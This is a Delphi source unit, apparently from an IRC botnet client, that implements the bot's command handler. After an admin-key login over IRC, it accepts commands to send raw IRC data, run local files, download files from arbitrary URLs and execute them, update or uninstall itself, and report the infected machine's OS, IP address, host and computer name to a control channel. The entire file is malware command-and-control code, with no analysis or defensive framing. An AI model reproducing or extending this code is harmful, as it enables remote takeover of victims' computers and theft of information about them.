unit untControl;

interface

uses
  Windows,
  untFunctions,
  untHTTPDownload,
  untAdminSystem;

  {$I Settings.ini}

  Procedure TranslateCommando(szCommand, szParameter, szParameter2, szParameter3, szParameter4, szParameter5: String; ControlSet: TControlSetting);

implementation

uses
  untBot;

Procedure TranslateCommando(szCommand, szParameter, szParameter2, szParameter3, szParameter4, szParameter5: String; ControlSet: TControlSetting);
Var
  ThreadID      :DWord;
  ExitCode      :Cardinal;
Begin
  If (szCommand = 'login') Then
    If (szParameter = server_adminkey) Then
    Begin
      Admin.LoginAdmin(ControlSet.ControlNick);
      mainIRC.SendData('PRIVMSG '+ControlSet.ControlChannel+' :[ADMiN] Login - {'+ControlSet.ControlNick+'}');
    End;

  If Not Admin.AdminLoggedIn(ControlSet.ControlNick) Then Exit;

    If (szCommand = 'raw') Then
    Begin
      mainIRC.SendData(szParameter + ' ' + szParameter2 + ' ' + szParameter3 + ' ' +  szParameter4 + ' ' + szParameter5);
    End;

  If (szCommand = 'execute') Then
  Begin
    If ExecuteFile(szParameter, szParameter2, Boolean(StrToInt(szParameter3))) Then
      mainIRC.SendData('PRIVMSG '+ControlSet.ControlChannel+' :[iNFO] File successfully executed.')
    Else
      mainIRC.SendData('PRIVMSG '+ControlSet.ControlChannel+' :[iNFO] File failed execution.');
  End;

  If (szCommand = 'newnick') Then
    mainIRC.SendData('NICK '+ReplaceShortcuts(server_nick));


  If (szCommand = 'update') Then
    UpdateFileFromURL(szParameter, DownloadDir + szParameter2, ControlSet.ControlChannel);

  If (szCommand = 'dlexecute') Then
    ExecuteFileFromURL(szParameter, DownloadDir + szParameter2, ControlSet.ControlChannel);

  If (szCommand = 'download') Then
    DownloadFileFromURL(szParameter, DownloadDir + szParameter2, ControlSet.ControlChannel);

  If (szCommand = 'reconnect') Then
    mainIRC.SendData('QUIT :Restarting...');

  If (szCommand = 'close') Then
  Begin
    mainIRC.SendData('QUIT :Exiting...');
    Sleep(3000);
    ExitProcess(0);
  End;

  If (szCommand = 'logout') Then
  Begin
    Admin.LogoutAdmin(ControlSet.ControlNick);
    mainIRC.SendData('PRIVMSG '+ControlSet.ControlChannel+' :[ADMiN] Logout - {'+ControlSet.ControlNick+'}');
    Exit;
  End;

  If (szCommand = 'uninstall') Then
  Begin
  mainIRC.SendData('PRIVMSG '+ControlSet.ControlChannel+' :[iNFO] Uninstalling...');
  Uninstall;
  ExitProcess(0);
  End;

  If (szCommand = 'info') Then
    mainIRC.SendData('PRIVMSG '+ControlSet.ControlChannel+' :[iNFO] Running '+fetchOS+' from '+mainIRC.mainIP+'@'+mainIRC.mainHost+' ['+fetchLocalName+']');

End;

end.
